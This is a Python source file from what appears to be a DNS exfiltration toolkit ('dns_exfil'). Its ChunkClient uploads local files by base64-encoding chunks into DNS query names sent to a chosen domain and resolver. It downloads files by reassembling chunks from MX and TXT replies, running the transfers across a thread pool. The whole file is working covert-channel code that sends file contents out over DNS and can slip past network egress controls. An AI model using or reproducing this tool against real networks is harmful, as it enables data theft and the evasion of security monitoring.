from multiprocessing.dummy import Pool, Lock
from functools import partial
import time
import base64
import os

import dnslib

from dns_exfil.exfiltrators.base.client import BaseClient

class FileNotFound(Exception):
    pass

class CannotReadChunk(Exception):
    pass

class ChunkClient(BaseClient):
    def __init__(self, domain, connect):
        self.domain = domain
        self.connect = connect
        super().__init__()
        self.open_files = {}
        self.open_lock = Lock()
    def file_info(self, filename, writable = False):
        with self.open_lock:
            if filename in self.open_files.keys():
                return self.open_files[filename]
            mode = {True: 'wb', False: 'rb'}[writable]
            file_handle = open(filename, mode)
            write_lock = Lock()
            self.open_files[filename] = dict(file_handle=file_handle, write_lock = write_lock)
        return self.file_info(filename, writable)
            
    def get_chunk(self, chunk_no, chunk_size, filename, tries=3):
        query_string = 'c{cn}.s{cs}.{fn}.{d}'.format(cn=chunk_no, cs=chunk_size, fn=filename, d=self.domain)
        record = dnslib.DNSRecord()
        record.add_question(dnslib.DNSQuestion(query_string, dnslib.QTYPE.MX))
        reply = dnslib.DNSRecord.parse(record.send(self.connect))
        def retry():
            time.sleep(0.5)
            if tries > 0:
                return self.get_chunk(chunk_no, chunk_size, filename, tries - 1)
            else:
                raise CannotReadChunk
        if reply.header.rcode != dnslib.RCODE.NOERROR:
            # Server reported an error in the response.
            return retry()
        try:
            last_resource_data = reply.rr[-1].rdata
            encoded_message = last_resource_data.get_label().label[0]
            decoded_message = base64.b64decode(encoded_message)
            return decoded_message
        except:
            # Server returned a response I don't understand.
            return retry()

    def get_index(self):
        record = dnslib.DNSRecord()
        record.add_question(dnslib.DNSQuestion(self.domain, dnslib.QTYPE.TXT))
        reply = dnslib.DNSRecord.parse(record.send(self.connect))
        last_resource_data = reply.rr[-1].rdata
        message = last_resource_data.data[0].decode('utf-8')
        parsed = []
        for csv in message.split(';'):
            name, size = csv.split(',')
            parsed.append(dict(name=name, size=size))
        return parsed

    def get_sizeof(self, filename):
        for entry in self.get_index():
            if entry['name'] == filename:
                return int(entry['size'])
        raise FileNotFound

    def put_chunk(self, chunk_info, chunk_size, filename):
        chunk_data, chunk_number = chunk_info
        encoded_message = base64.standard_b64encode(chunk_data).decode('utf-8')
        query_string = '{em}.c{cn}.s{cs}.{fn}.{d}'.format(em=encoded_message, cn=chunk_number,
                                                        cs=chunk_size, fn=filename, d=self.domain)
        record = dnslib.DNSRecord()
        record.add_question(dnslib.DNSQuestion(query_string, dnslib.QTYPE.A))
        record.send(self.connect)
    def write_chunk(self, file_info, seek, data):
            with file_info['write_lock']:
                handle = file_info['file_handle']
                handle.seek(seek)
                handle.write(data)
                handle.flush()

    def download(self, filename, chunk_size=30, pool_size=10):
        num_chunks = int(self.get_sizeof(filename) / chunk_size) + 1
        file_info = self.file_info(filename, writable=True)
        pool = Pool(min(pool_size, num_chunks))
        def save_chunk(chunk_no):
            chunk = self.get_chunk(chunk_no, chunk_size, filename)
            self.write_chunk(file_info, chunk_size * chunk_no,  chunk)
        with file_info['file_handle']:
            pool.map(save_chunk, range(num_chunks))

    def upload(self, filename, chunk_size=30, pool_size=10):
        local_filename = filename
        remote_filename = filename.replace('.', '_')
        file_info = self.file_info(local_filename, writable=False)
        num_chunks = int(os.stat(file_info['file_handle'].fileno()).st_size / chunk_size) + 1
        pool = Pool(min(pool_size, num_chunks))
        def chunkgen():
            chunk_no = 0
            with file_info['file_handle'] as f:
                while True:
                    data = f.read(chunk_size)
                    if not data:
                        raise StopIteration
                    yield data, chunk_no
                    chunk_no += 1
        send = partial(self.put_chunk, chunk_size=chunk_size, filename=remote_filename)
        pool.map(send, chunkgen())
